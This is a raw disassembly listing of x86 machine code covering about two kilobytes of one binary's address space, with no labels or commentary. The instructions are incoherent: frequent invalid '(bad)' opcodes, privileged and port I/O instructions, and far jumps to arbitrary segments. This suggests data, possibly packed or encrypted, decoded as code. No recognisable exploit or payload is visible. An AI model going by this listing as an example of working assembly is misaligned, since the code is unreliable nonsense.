  409079:	xlat   BYTE PTR ds:[ebx]
  40907a:	bound  esi,QWORD PTR [eax-0x1c6959be]
  409080:	arpl   WORD PTR [eax-0x26],di
  409083:	push   edi
  409084:	sbb    BYTE PTR ds:0xa34681ed,dh
  40908a:	cmp    BYTE PTR [ecx-0x6c0cad14],cl
  409090:	xor    BYTE PTR [ebx-0x53],dl
  409093:	mov    esp,0x6fa0a763
  409098:	mov    esp,0xebfa213c
  40909d:	xlat   BYTE PTR ds:[ebx]
  40909e:	scas   al,BYTE PTR es:[edi]
  40909f:	mov    eax,ds:0x21b5e7cc
  4090a4:	inc    ebp
  4090a5:	xchg   ebp,eax
  4090a6:	outs   dx,DWORD PTR ds:[esi]
  4090a7:	aas    
  4090a8:	xchg   ebp,eax
  4090a9:	xchg   edx,eax
  4090aa:	gs pop ss
  4090ac:	sub    DWORD PTR [eax+ebp*2-0x1dd38d78],ebp
  4090b3:	mov    edx,0xf4a3ddd6
  4090b8:	cdq    
  4090b9:	xor    al,0xdd
  4090bb:	ror    DWORD PTR [edx],0x82
  4090be:	push   esi
  4090bf:	(bad)  
  4090c0:	cld    
  4090c1:	or     al,0x61
  4090c3:	jmp    0x31fa:0x39714393
  4090ca:	je     0x409100
  4090cc:	mov    ds:0xb4a75b77,al
  4090d1:	add    BYTE PTR [edi+eax*1-0x2d],bl
  4090d5:	icebp  
  4090d6:	ror    DWORD PTR [esi],0x41
  4090d9:	aad    0x78
  4090db:	mov    ch,0x44
  4090dd:	sbb    ecx,DWORD PTR [edx]
  4090df:	add    ah,BYTE PTR [edx-0x3540dfac]
  4090e5:	das    
  4090e6:	jg     0x40912d
  4090e8:	sub    al,0xb
  4090ea:	jge    0x409123
  4090ec:	sbb    al,0xde
  4090ee:	cld    
  4090ef:	sbb    BYTE PTR [eax+0x2cedfc97],bh
  4090f5:	sbb    dh,BYTE PTR [edi]
  4090f7:	imul   eax,DWORD PTR [edx-0x6cf8e8d6],0x878e2d07
  409101:	mov    bh,0xbd
  409103:	enter  0x56c7,0x64
  409107:	sub    bh,dl
  409109:	or     esi,edx
  40910b:	inc    ecx
  40910c:	mov    al,0x15
  40910e:	jbe    0x4090d0
  409110:	repnz fbstp TBYTE PTR [esi+0x15]
  409114:	push   ss
  409115:	add    bl,dl
  409117:	enter  0x2062,0xd6
  40911b:	ja     0x4090b2
  40911d:	mov    ds:0x8cdfe5bf,eax
  409122:	adc    DWORD PTR [eax-0x3e93eee7],0xffffffed
  409129:	add    al,0x25
  40912b:	mov    dl,0x40
  40912d:	loopne 0x409146
  40912f:	aad    0x76
  409131:	mov    esp,0x6f2f0fbf
  409136:	cdq    
  409137:	jo     0x4090f4
  409139:	test   eax,0xf420c7b3
  40913e:	mov    ch,bh
  409140:	inc    esi
  409141:	in     al,0xce
  409143:	or     edi,edi
  409145:	sbb    BYTE PTR [ebp-0x72],bh
  409148:	mov    DWORD PTR [ecx],edi
  40914a:	jmp    0x1f2b:0x77d60959
  409151:	xor    eax,0xe724cbe4
  409156:	or     dh,al
  409158:	outs   dx,DWORD PTR ds:[esi]
  409159:	fidiv  DWORD PTR [eax-0x7d178469]
  40915f:	dec    esi
  409160:	xor    dh,BYTE PTR [eax+eiz*8+0x52]
  409164:	and    BYTE PTR [edx],bl
  409166:	sub    eax,0x7b64b1a3
  40916b:	or     bl,dl
  40916d:	cmp    ah,bl
  40916f:	inc    esi
  409170:	mov    edx,DWORD PTR [ebp-0x5f]
  409173:	(bad)  
  409174:	pop    edx
  409175:	or     BYTE PTR [eax+0x573c85cc],bh
  40917b:	je     0x409189
  40917d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40917e:	xor    al,0x3f
  409180:	fld    DWORD PTR [ebp+0x6bfb3344]
  409186:	scas   al,BYTE PTR es:[edi]
  409187:	dec    ebx
  409188:	int3   
  409189:	retf   
  40918a:	sbb    DWORD PTR [eax],ebp
  40918c:	inc    eax
  40918d:	div    dh
  40918f:	pop    edx
  409190:	lahf   
  409191:	dec    ebp
  409192:	and    al,al
  409194:	arpl   WORD PTR [ecx-0x3c],bx
  409197:	push   esp
  409198:	(bad)  
  409199:	jmp    0x4091ef
  40919b:	ins    DWORD PTR es:[edi],dx
  40919c:	aad    0x9a
  40919e:	mov    edi,0x6ede5d4d
  4091a3:	mov    BYTE PTR [esi-0x7f31eb44],0x5f
  4091aa:	and    bl,BYTE PTR [ecx-0x6b]
  4091ad:	dec    ecx
  4091ae:	les    edx,FWORD PTR [edi+ebx*4-0x298b2108]
  4091b5:	out    0x5e,eax
  4091b7:	mov    DWORD PTR [edx+edi*1],0x7b3e73d8
  4091be:	jno    0x409147
  4091c0:	iret   
  4091c1:	sbb    BYTE PTR [edx],dh
  4091c3:	ror    BYTE PTR [ecx-0x2b8d9455],0x4a
  4091ca:	jg     0x409173
  4091cc:	xchg   esi,eax
  4091cd:	fimul  WORD PTR [ebx-0x6]
  4091d0:	ins    BYTE PTR es:[edi],dx
  4091d1:	adc    dh,ch
  4091d3:	or     dh,BYTE PTR [edi+0x31]
  4091d6:	xchg   edx,eax
  4091d7:	fcmove st,st(2)
  4091d9:	pop    eax
  4091da:	mov    eax,0x8f113244
  4091df:	fwait
  4091e0:	cmp    eax,0x5d418d9f
  4091e5:	and    al,0x33
  4091e7:	add    eax,0x4cc47654
  4091ec:	mov    bh,0x3f
  4091ee:	mov    ecx,eax
  4091f0:	inc    edx
  4091f1:	pop    ebp
  4091f2:	cli    
  4091f3:	scas   eax,DWORD PTR es:[edi]
  4091f4:	jmp    0x3f4ad387
  4091f9:	mov    BYTE PTR [edx+0x48],cl
  4091fc:	mov    esp,0x417cba01
  409201:	mov    esp,edi
  409203:	adc    al,0x10
  409205:	(bad)  
  409206:	es dec edi
  409208:	outs   dx,DWORD PTR fs:[esi]
  40920a:	adc    eax,0x42e73d30
  40920f:	and    esi,ecx
  409211:	pop    es
  409212:	rcr    DWORD PTR [esi],1
  409214:	or     cl,dh
  409216:	cs push 0x6
  409219:	jbe    0x409208
  40921b:	dec    esi
  40921c:	pop    es
  40921d:	pop    ebx
  40921e:	int3   
  40921f:	jno    0x4091d5
  409221:	lods   al,BYTE PTR ds:[esi]
  409222:	mov    ah,0x99
  409224:	push   esp
  409225:	mov    bh,0x2
  409227:	sti    
  409228:	lds    esi,FWORD PTR [esi-0x1a6c092e]
  40922e:	dec    ebp
  40922f:	add    al,0xce
  409231:	stos   DWORD PTR es:[edi],eax
  409232:	lea    ecx,[eax+esi*4+0x33167238]
  409239:	push   ebx
  40923a:	in     al,0x4e
  40923c:	adc    eax,0x213c4933
  409241:	add    BYTE PTR [esi],cl
  409243:	xor    al,0xb
  409245:	xor    esp,DWORD PTR [eax+eax*2]
  409248:	loopne 0x4091ec
  40924a:	add    ebp,DWORD PTR [eax+edx*8+0x3adfe5e7]
  409251:	inc    esp
  409252:	imul   edi,DWORD PTR [esp+ecx*4+0x2],0xffffffce
  409257:	addr16 and eax,0xf1c3dcaa
  40925d:	shl    DWORD PTR [edi],cl
  40925f:	pushf  
  409260:	mov    dh,0xdc
  409262:	adc    BYTE PTR [ecx],dh
  409264:	js     0x40923e
  409266:	inc    ebp
  409267:	fwait
  409268:	cmp    dh,al
  40926a:	push   ds
  40926b:	(bad)  
  40926c:	xor    DWORD PTR [edx+eax*4+0x6e21d8ac],edi
  409273:	pop    ebp
  409274:	ds inc edx
  409276:	ins    BYTE PTR es:[edi],dx
  409277:	stos   BYTE PTR es:[edi],al
  409278:	xor    al,0x5a
  40927a:	fisubr WORD PTR [edx+0x5ded490c]
  409280:	fisub  DWORD PTR [esi]
  409282:	push   esi
  409283:	idiv   DWORD PTR [edx+0x1f]
  409286:	or     DWORD PTR [esi+0x35],0x1a
  40928a:	cmp    ebp,esi
  40928c:	or     edx,DWORD PTR [eax]
  40928e:	test   eax,0x594709aa
  409293:	pop    esi
  409294:	not    ebx
  409296:	lods   eax,DWORD PTR ds:[esi]
  409297:	or     eax,0x473644e
  40929c:	(bad)  
  40929d:	fstp   QWORD PTR ds:0x9fa2b158
  4092a3:	pop    ebp
  4092a4:	add    ebx,DWORD PTR cs:[ebx-0x76]
  4092a8:	jno    0x409288
  4092aa:	jge    0x4092e3
  4092ac:	add    al,0xcc
  4092ae:	leave  
  4092af:	test   dh,ch
  4092b1:	sbb    eax,0x74cec672
  4092b6:	push   edi
  4092b7:	cmp    eax,0x9088b5f
  4092bc:	fnsave [edi]
  4092be:	mov    ebp,0xabd86920
  4092c3:	scas   eax,DWORD PTR es:[edi]
  4092c4:	sti    
  4092c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092c6:	jne    0x4092de
  4092c8:	dec    esp
  4092c9:	in     al,0x16
  4092cb:	push   0xffffffb0
  4092cd:	cmc    
  4092ce:	fdiv   QWORD PTR [eax-0x50264350]
  4092d4:	repnz dec esi
  4092d6:	xor    esp,DWORD PTR [edx+0x75]
  4092d9:	pop    es
  4092da:	imul   esp,ebp,0xffffff98
  4092dd:	ins    BYTE PTR es:[edi],dx
  4092de:	(bad)  
  4092df:	out    dx,al
  4092e0:	xor    eax,DWORD PTR [edx-0x6eda41b5]
  4092e6:	out    0x93,al
  4092e8:	and    eax,0x4a51bd80
  4092ed:	into   
  4092ee:	pop    ss
  4092ef:	mov    ecx,0xb21c49a6
  4092f4:	ja     0x409374
  4092f6:	inc    ebx
  4092f7:	push   0xffffffcf
  4092f9:	jecxz  0x409350
  4092fb:	lds    esi,FWORD PTR [esi-0x2e2b8bd7]
  409301:	stos   DWORD PTR es:[edi],eax
  409302:	pop    ebp
  409303:	cmp    eax,0xc90f25c5
  409308:	cmp    eax,0xcdb4ab34
  40930d:	inc    edx
  40930e:	or     DWORD PTR ds:0xd194ff61,0xd799a18c
  409318:	jecxz  0x4092a0
  40931a:	push   0x14
  40931c:	add    DWORD PTR [ebp-0x5281dc1f],ecx
  409322:	mov    ebp,ecx
  409324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409325:	xor    DWORD PTR [eax+eax*8+0x35],ebx
  409329:	mov    edi,0x8f578eb4
  40932e:	(bad)  
  40932f:	cli    
  409330:	outs   dx,DWORD PTR ds:[esi]
  409331:	stc    
  409332:	ret    
  409333:	jne    0x4092da
  409335:	nop
  409336:	pop    ebx
  409337:	dec    esi
  409338:	scas   al,BYTE PTR es:[edi]
  409339:	mov    esp,0x3ad678b6
  40933e:	jmp    0x409341
  409340:	mov    ds:0x495458d7,al
  409345:	xchg   esi,eax
  409346:	(bad)  [ebp+0xf]
  409349:	cmp    eax,eax
  40934b:	icebp  
  40934c:	popf   
  40934d:	popa   
  40934e:	jnp    0x409328
  409350:	aas    
  409351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409352:	mov    eax,0xde9fa45
  409357:	pop    edi
  409358:	dec    esp
  409359:	loope  0x4093bf
  40935b:	adc    eax,DWORD PTR [esp+ebp*2-0x7]
  40935f:	pop    ss
  409360:	sub    eax,0x5f647f75
  409366:	fnsave ds:0x9b21f344
  40936c:	sub    ecx,DWORD PTR [ecx]
  40936e:	jnp    0x409388
  409370:	std    
  409371:	or     ah,BYTE PTR [esi-0x57]
  409374:	add    edx,DWORD PTR [edi]
  409376:	cmp    al,0xb7
  409378:	adc    esp,DWORD PTR [ecx-0x47bb4841]
  40937e:	mov    cl,0xa9
  409380:	in     eax,0x8f
  409382:	pop    ds
  409383:	sti    
  409384:	repnz nop
  409386:	dec    ebp
  409387:	inc    esp
  409388:	pop    esp
  409389:	cli    
  40938a:	and    eax,0x80b810e
  40938f:	xchg   BYTE PTR [ebx],dh
  409391:	pushf  
  409392:	pop    ss
  409393:	stos   DWORD PTR es:[edi],eax
  409394:	jns    0x409390
  409396:	xchg   DWORD PTR [eax-0x58f86854],eax
  40939c:	loop   0x409339
  40939e:	xchg   esp,eax
  40939f:	lds    ebx,FWORD PTR [edi-0x2d80968c]
  4093a5:	pop    es
  4093a6:	fidivr DWORD PTR [ebp+0x300face0]
  4093ac:	es (bad) 
  4093ae:	jecxz  0x40940c
  4093b0:	repz scas al,BYTE PTR es:[edi]
  4093b2:	push   ss
  4093b3:	in     eax,0x60
  4093b5:	test   ecx,esi
  4093b7:	mov    edx,0x33ac542c
  4093bc:	add    al,0x81
  4093be:	xor    eax,0x426fc2c8
  4093c3:	and    al,0x4f
  4093c5:	jle    0x409375
  4093c7:	push   0x57e82581
  4093cc:	xor    al,0x73
  4093ce:	loopne 0x40938c
  4093d0:	and    dl,BYTE PTR [ebx+0x6d7dae22]
  4093d6:	out    dx,eax
  4093d7:	fs loopne 0x40943e
  4093da:	lds    ebx,FWORD PTR [ebx+edx*2+0x86cb950]
  4093e1:	sbb    eax,0xd37037fb
  4093e6:	sub    eax,0x38257bd2
  4093eb:	dec    edi
  4093ec:	rep outs dx,DWORD PTR ds:[esi]
  4093ee:	ror    BYTE PTR [esi+0x2],cl
  4093f1:	mov    ebp,eax
  4093f3:	pushf  
  4093f4:	push   ss
  4093f5:	(bad)  
  4093f6:	pushf  
  4093f7:	rol    BYTE PTR [edi-0x2e],cl
  4093fa:	fs mov bl,BYTE PTR ss:[eax-0x7e8443ca]
  409402:	jne    0x409481
  409404:	cmc    
  409405:	fld    DWORD PTR [edx+0x32]
  409408:	popa   
  409409:	mov    esp,0xf279f974
  40940e:	gs loopne 0x409489
  409411:	dec    ebp
  409412:	add    al,0xc4
  409414:	(bad)  
  409416:	adc    BYTE PTR ss:[esi],0x59
  40941a:	int3   
  40941b:	sbb    eax,DWORD PTR [eax+0x2a]
  40941e:	pop    eax
  40941f:	mov    eax,0xebe863f8
  409424:	xor    BYTE PTR [ebp+0x2f],bl
  409427:	push   ecx
  409428:	push   0x4
  40942a:	mov    esi,0xbd3f4f74
  40942f:	dec    eax
  409430:	pop    ebp
  409431:	cmp    BYTE PTR [edx-0x7ebf1934],dl
  409437:	mov    cl,0x8c
  409439:	fadd   st,st(4)
  40943b:	cli    
  40943c:	ins    BYTE PTR es:[edi],dx
  40943d:	xor    eax,0xffffffcb
  409440:	pop    esp
  409441:	imul   eax,DWORD PTR ds:0xe6b526e9,0xfffffff1
  409448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409449:	fisubr DWORD PTR [esi]
  40944b:	inc    eax
  40944c:	and    al,0xfb
  40944e:	jmp    0x240e636d
  409453:	push   edx
  409454:	xor    eax,0x86389257
  409459:	les    edi,FWORD PTR [esi-0x2f]
  40945c:	jmp    0x9161499
  409461:	cmp    cl,BYTE PTR [esi+0x22]
  409464:	push   edx
  409465:	enter  0x52a9,0xb6
  409469:	nop
  40946a:	(bad)  
  40946c:	mov    ds:0x94a4b290,eax
  409471:	test   al,0x90
  409473:	test   DWORD PTR [ebp+0x10fbe9a9],ebx
  409479:	sbb    BYTE PTR [edi],cl
  40947b:	dec    DWORD PTR [eax+eiz*4+0x4a4569f7]
  409482:	sub    eax,0x7d10bbde
  409487:	inc    esi
  409488:	add    BYTE PTR ds:0x6a9a4f4e,cl
  40948e:	popa   
  40948f:	sub    al,0x1f
  409491:	push   0xd00cb801
  409496:	jae    0x4094ef
  409498:	ret    
  409499:	stos   DWORD PTR es:[edi],eax
  40949a:	mov    eax,0xade97ce4
  40949f:	adc    ebp,DWORD PTR [edi]
  4094a1:	clc    
  4094a2:	fcmove st,st(0)
  4094a4:	(bad)  
  4094a5:	xor    DWORD PTR [ebx+esi*1+0x41],edi
  4094a9:	hlt    
  4094aa:	(bad)  
  4094ab:	jmp    0x8db6ea57
  4094b0:	(bad)  
  4094b1:	pusha  
  4094b2:	aas    
  4094b3:	sbb    dl,BYTE PTR [ebx+0x56946e5b]
  4094b9:	xor    eax,0xcad6a475
  4094be:	pusha  
  4094bf:	scas   al,BYTE PTR es:[edi]
  4094c0:	clc    
  4094c1:	shr    esi,cl
  4094c3:	pop    esp
  4094c4:	xchg   ebp,eax
  4094c5:	adc    ecx,ebp
  4094c7:	inc    esi
  4094c8:	push   ebx
  4094c9:	adc    DWORD PTR [edi+0x5d],esi
  4094cc:	test   BYTE PTR [edx+0x50ee5e5e],bl
  4094d2:	in     eax,0x28
  4094d4:	fld    DWORD PTR [ebp+0x4a6e70cc]
  4094da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094db:	in     eax,dx
  4094dc:	pop    eax
  4094dd:	dec    edi
  4094de:	inc    ebx
  4094df:	cli    
  4094e0:	mov    ah,0x82
  4094e2:	xor    eax,0xafc64d18
  4094e7:	loopne 0x409566
  4094e9:	out    dx,eax
  4094ea:	sar    BYTE PTR [edx+0x57f8b819],0x3f
  4094f1:	add    BYTE PTR [ebx-0x12],ah
  4094f4:	int3   
  4094f5:	push   edi
  4094f6:	mov    ds:0xc735ef37,al
  4094fb:	sbb    ebp,ebx
  4094fd:	retf   0x4fe3
  409500:	loop   0x4094f5
  409502:	xor    BYTE PTR [eax+esi*4-0x385ca5a5],ah
  409509:	push   edx
  40950a:	imul   edi,DWORD PTR [ebx],0x57
  40950d:	fs mov ah,0xe2
  409510:	or     dl,cl
  409512:	clc    
  409513:	jle    0x4094a6
  409515:	pushf  
  409516:	jmp    0x1259:0xc4e3e9e9
  40951d:	nop
  40951e:	push   cs
  40951f:	call   0x12928db
  409524:	imul   ecx,DWORD PTR [esi],0x2068ea30
  40952a:	into   
  40952b:	mov    bl,0xe0
  40952d:	imul   ebp,DWORD PTR [edx+0x6c2c8982],0xaf882b50
  409537:	fcmovu st,st(6)
  409539:	js     0x4094f8
  40953b:	das    
  40953c:	out    dx,al
  40953d:	rcr    BYTE PTR ds:0xf6ca5bea,cl
  409543:	mov    al,0x46
  409545:	(bad)  
  409546:	push   ss
  409547:	xchg   edx,eax
  409548:	pop    ecx
  409549:	dec    ebp
  40954a:	inc    eax
  40954b:	outs   dx,DWORD PTR ds:[esi]
  40954c:	push   esp
  40954d:	enter  0xfdda,0xb
  409551:	or     al,0x78
  409553:	pop    edi
  409554:	jbe    0x409598
  409556:	sub    DWORD PTR [edx-0x7973685c],0xffffffb3
  40955d:	imul   esi,DWORD PTR [edi+0x71],0x5d53490a
  409564:	cmp    esi,ebp
  409566:	lds    eax,FWORD PTR [ebx+0x47220c37]
  40956c:	dec    eax
  40956d:	popa   
  40956e:	sub    al,0xd0
  409570:	(bad)  
  409571:	sub    eax,0x95c506a0
  409576:	jl     0x409500
  409578:	push   cs
  409579:	lock jnp 0x4095fb
  40957c:	jmp    0x4095f4
  40957e:	xor    eax,0xa1d1900a
  409583:	fsub   QWORD PTR [edi+0x48]
  409586:	add    DWORD PTR [ebp-0x19286ff2],esi
  40958c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40958d:	shr    BYTE PTR [ecx],1
  40958f:	lods   eax,DWORD PTR ds:[esi]
  409590:	es fdivr st,st(5)
  409593:	pop    esp
  409594:	sar    DWORD PTR [edx+0x5c],0x26
  409598:	adc    BYTE PTR [eax+0x74],bl
  40959b:	push   esi
  40959c:	out    0x12,al
  40959e:	gs sbb al,0xba
  4095a1:	jne    0x4095c9
  4095a3:	je     0x4095e4
  4095a5:	xor    ch,BYTE PTR [edx+0x117b5609]
  4095ab:	(bad)  
  4095ad:	xor    al,0x8f
  4095af:	and    BYTE PTR [edx],0xbe
  4095b2:	inc    eax
  4095b3:	stos   DWORD PTR es:[edi],eax
  4095b4:	jle    0x409607
  4095b6:	(bad)  
  4095b7:	std    
  4095b8:	out    0x88,al
  4095ba:	sub    eax,0xa2ff7bb0
  4095bf:	mov    esi,0x66d4182
  4095c4:	add    BYTE PTR [edi+eiz*1+0x287af837],0x7d
  4095cc:	lahf   
  4095cd:	pop    edx
  4095ce:	xchg   ecx,eax
  4095cf:	ins    DWORD PTR es:[edi],dx
  4095d0:	or     DWORD PTR [ebx+0x5d679d9b],edi
  4095d6:	fs add eax,0xb3c06d4a
  4095dc:	adc    eax,DWORD PTR ds:0x2bfd070b
  4095e2:	ins    BYTE PTR es:[edi],dx
  4095e3:	fs in  al,dx
  4095e5:	rcr    BYTE PTR [ecx-0x7ad67fa9],cl
  4095eb:	sbb    ah,BYTE PTR [ecx-0x7a]
  4095ee:	xchg   BYTE PTR [ecx+0x66],cl
  4095f1:	fdivr  DWORD PTR [esi-0x6f]
  4095f4:	cmp    DWORD PTR [ecx-0xa],edx
  4095f7:	pusha  
  4095f8:	aad    0xb1
  4095fa:	inc    edi
  4095fb:	loope  0x4095ed
  4095fd:	retf   0x8163
  409600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409601:	pop    ss
  409602:	inc    esp
  409603:	fst    DWORD PTR [ecx+esi*1]
  409606:	sub    ah,BYTE PTR [esi]
  409608:	or     eax,0x65e55d79
  40960d:	(bad)  
  40960e:	pop    esp
  40960f:	pop    ebx
  409610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409611:	shl    BYTE PTR [ebp+0x2ee4d23d],cl
  409617:	sbb    eax,0x620c3d7
  40961c:	pop    eax
  40961d:	cmp    al,0x5
  40961f:	repz lahf 
  409621:	mov    esp,0xe8f5f9aa
  409626:	jnp    0x409656
  409628:	pop    ebx
  409629:	push   edx
  40962a:	mov    esi,DWORD PTR [ebx]
  40962c:	div    dh
  40962e:	dec    edx
  40962f:	fadd   DWORD PTR [esi-0x8]
  409632:	add    al,BYTE PTR [ebp+0xc28e790]
  409638:	scas   eax,DWORD PTR es:[edi]
  409639:	mov    ch,0x78
  40963b:	xor    DWORD PTR [edx-0x5b74c29d],edx
  409641:	ss mov ecx,0xf2157d1
  409647:	xlat   BYTE PTR ds:[ebx]
  409648:	push   ss
  409649:	gs jg  0x409628
  40964c:	jp     0x409678
  40964e:	jbe    0x40960c
  409650:	jle    0x40961a
  409652:	inc    esi
  409653:	iret   
  409654:	push   esp
  409655:	inc    edx
  409656:	sahf   
  409657:	aas    
  409658:	aam    0x96
  40965a:	int    0xba
  40965c:	pop    edi
  40965d:	retf   0xd34
  409660:	loope  0x409614
  409662:	dec    ebx
  409663:	fnstsw WORD PTR [esi-0x3e4ee5b5]
  409669:	xchg   ebp,eax
  40966a:	add    DWORD PTR [ebp+0x17],esp
  40966d:	inc    esp
  40966e:	hlt    
  40966f:	jle    0x409609
  409671:	es ret 0xd1ff
  409675:	pop    esp
  409676:	sub    al,0x4e
  409678:	imul   eax,DWORD PTR [edx-0x3e9f978f],0x44367f9
  409682:	out    dx,eax
  409683:	add    al,0xc4
  409685:	cmpxchg bl,dl
  409688:	mov    eax,ds:0x4baec571
  40968d:	mov    ds:0xf94dc8a,eax
  409692:	test   BYTE PTR [edi+0x493d6a1e],dl
  409698:	mov    dl,0xf1
  40969a:	call   0x1da2:0x7edad748
  4096a1:	cmp    BYTE PTR [ebp+eiz*2-0x4d],dl
  4096a5:	mov    ebx,0xa1c1ef41
  4096aa:	fisttp QWORD PTR [ebx]
  4096ac:	stos   BYTE PTR es:[edi],al
  4096ad:	lds    esi,FWORD PTR [eax-0x40ff33c6]
  4096b3:	in     al,0x35
  4096b5:	dec    esp
  4096b6:	and    cl,BYTE PTR [eax]
  4096b8:	mov    ah,BYTE PTR [edi+0x6e497d33]
  4096be:	or     dh,BYTE PTR [eax]
  4096c0:	nop
  4096c1:	imul   ebp,DWORD PTR [eax-0x74],0xffa30b0d
  4096c8:	ficomp DWORD PTR [ecx+0x2f]
  4096cb:	and    DWORD PTR [edi+0x5bceedae],esi
  4096d1:	push   ss
  4096d2:	loope  0x4096ef
  4096d4:	and    ecx,DWORD PTR [esi-0x7075a791]
  4096da:	push   ebx
  4096db:	adc    dh,BYTE PTR [eax+0x6e]
  4096de:	fst    DWORD PTR [eax]
  4096e0:	clc    
  4096e1:	mov    edi,fs
  4096e3:	cwde   
  4096e4:	mov    WORD PTR [esi-0x177bfab9],gs
  4096ea:	push   ecx
  4096eb:	lahf   
  4096ec:	jnp    0x409753
  4096ee:	adc    BYTE PTR [edx],al
  4096f0:	ins    DWORD PTR es:[edi],dx
  4096f1:	cmovge esi,DWORD PTR [edi+0x46948a01]
  4096f8:	imul   esi,DWORD PTR gs:[ebp-0x6],0x2a1eb950
  409700:	cdq    
  409701:	pop    ecx
  409702:	adc    esi,DWORD PTR [edx+0x415b1f52]
  409708:	int3   
  409709:	inc    ecx
  40970a:	cmp    al,0x68
  40970c:	dec    eax
  40970d:	ror    BYTE PTR [ebp+eiz*1-0x2b],0x71
  409712:	lods   eax,DWORD PTR ds:[esi]
  409713:	add    ecx,DWORD PTR [eax-0x2c]
  409716:	dec    ebx
  409717:	pop    esp
  409718:	dec    edi
  409719:	push   ebp
  40971a:	adc    DWORD PTR [ebx],0xa720849b
  409720:	pop    ebx
  409721:	fldcw  WORD PTR [edx-0x69]
  409724:	fisubr DWORD PTR [eax-0x34d51517]
  40972a:	push   esi
  40972b:	jo     0x40973f
  40972d:	cmp    DWORD PTR [esi+esi*2+0x7a],ebx
  409731:	(bad)  
  409732:	mov    ah,0x61
  409734:	fwait
  409735:	scas   al,BYTE PTR es:[edi]
  409736:	sub    DWORD PTR [edx+0x100f072d],ebx
  40973c:	imul   ebx,DWORD PTR [ecx+esi*8],0x27
  409740:	aas    
  409741:	les    ebx,FWORD PTR [eax+0x39]
  409744:	int    0x3b
  409746:	sahf   
  409747:	push   ss
  409748:	call   0x8885:0x10611167
  40974f:	xchg   esi,eax
  409750:	mov    ebp,0x5e120997
  409755:	inc    esp
  409756:	sbb    bh,bh
  409758:	lock lock jb 0x409739
  40975c:	sub    DWORD PTR [esi+0x3209ce89],ebx
  409762:	stc    
  409763:	mov    al,ds:0x6a48c7f7
  409768:	(bad)  
  409769:	sub    DWORD PTR [edx+0x74],ecx
  40976c:	dec    edx
  40976d:	aad    0xd5
  40976f:	and    edi,DWORD PTR [edi-0x2a3384d6]
  409775:	cmp    eax,0x710b0d1b
  40977a:	jmp    0x4ee6:0x9360b37c
  409781:	mov    al,0x90
  409783:	into   
  409784:	loop   0x4097b6
  409786:	imul   eax,ecx,0x52
  409789:	push   ebx
  40978a:	(bad)  
  40978b:	neg    DWORD PTR [edx]
  40978d:	stos   DWORD PTR es:[edi],eax
  40978e:	scas   al,BYTE PTR es:[edi]
  40978f:	call   0xc46e8664
  409794:	mov    bh,0xa4
  409796:	xchg   ebx,eax
  409797:	xor    edi,ebp
  409799:	aas    
  40979a:	jmp    0x4491:0xbb5a98ff
  4097a1:	sbb    al,0x36
  4097a3:	add    DWORD PTR [eax+0x7aeb6794],edi
  4097a9:	adc    bh,BYTE PTR [edi+0x21]
  4097ac:	or     BYTE PTR [ecx],bl
  4097ae:	jnp    0x409735
  4097b0:	mov    bh,BYTE PTR [eax-0x32]
  4097b3:	pop    edi
  4097b4:	shl    DWORD PTR [eax+esi*1],1
  4097b7:	dec    edx
  4097b8:	xchg   esi,eax
  4097b9:	mov    eax,0x91385912
  4097be:	add    DWORD PTR [eax+edx*1-0x3b5e2d11],esi
  4097c5:	mov    ds:0xc6857b,al
  4097ca:	fisttp QWORD PTR [ebx]
  4097cc:	mov    cl,0xdb
  4097ce:	sbb    edi,ebp
  4097d0:	or     eax,0xd66c219
  4097d5:	mov    edx,DWORD PTR [ebp+esi*2-0x6b]
  4097d9:	lods   al,BYTE PTR ds:[esi]
  4097da:	mov    ch,0x70
  4097dc:	and    bh,al
  4097de:	dec    esp
  4097df:	hlt    
  4097e0:	push   ebp
  4097e1:	lahf   
  4097e2:	cmp    edi,ebp
  4097e4:	sbb    al,0x47
  4097e7:	jmp    0x173c:0xbdcf55f7
  4097ee:	(bad)  
  4097ef:	aas    
  4097f0:	push   eax
  4097f1:	add    al,0x65
  4097f3:	mov    eax,0x3f49745f
  4097f8:	repz popa 
  4097fa:	push   ecx
  4097fb:	or     DWORD PTR [ecx+0x17f498ba],ebp
  409801:	sub    BYTE PTR fs:[ecx-0x19],ch
  409805:	out    dx,al
  409806:	push   esp
  409807:	and    BYTE PTR [edi+0x7c8252d8],dh
  40980d:	cmp    eax,DWORD PTR [eax]
  40980f:	cmp    BYTE PTR [eax+0x4363d5b2],0xfa
  409816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409817:	lds    esp,FWORD PTR [edi+edi*4]
  40981a:	pop    esi
  40981b:	stos   DWORD PTR es:[edi],eax
  40981c:	daa    
  40981d:	adc    ah,ch
  40981f:	out    dx,eax
  409820:	arpl   dx,dx
  409822:	ret    
  409823:	push   ecx
  409824:	sub    WORD PTR [edx+edx*2],ax
  409828:	and    al,0x90
  40982a:	xchg   ebp,eax
  40982b:	mov    ch,0xab
  40982d:	fistp  QWORD PTR [edi+edi*2+0x3d27d74d]
  409834:	mov    ebx,0x4b669ead
  409839:	jnp    0x4097c8
  40983b:	(bad)
  40983e:	pop    ss
  40983f:	sbb    al,0xb1
  409841:	mov    fs,ecx
  409843:	(bad)  
  409844:	jle    0x40985c
  409846:	in     al,dx
  409847:	fistp  WORD PTR [esi+0x48a7c0cc]
  40984d:	mov    ebp,0x6639861b
  409852:	dec    edi
  409853:	int    0xb6
  409855:	xor    al,0x2e
  409857:	fild   QWORD PTR [ebx-0x3ba58bf3]
  40985d:	inc    ebp
  40985e:	outs   dx,BYTE PTR ds:[esi]
  40985f:	mov    ebp,0x4cc9145d
  409864:	xchg   ecx,eax
  409865:	cmp    DWORD PTR [ecx-0x734a9e3],edx
  40986b:	xor    ebx,DWORD PTR [eax]
  40986d:	bound  ebx,QWORD PTR [ebp+0x4d]
  409870:	dec    edx
  409871:	xchg   esp,eax
  409872:	pushf  
  409873:	daa    
  409874:	dec    edi
  409875:	(bad)
  409878:	aam    0x2e
  40987a:	add    al,0xeb
  40987c:	es scas eax,DWORD PTR es:[edi]
  40987e:	inc    edx
  40987f:	mov    DWORD PTR [ebx+ebp*4],edx
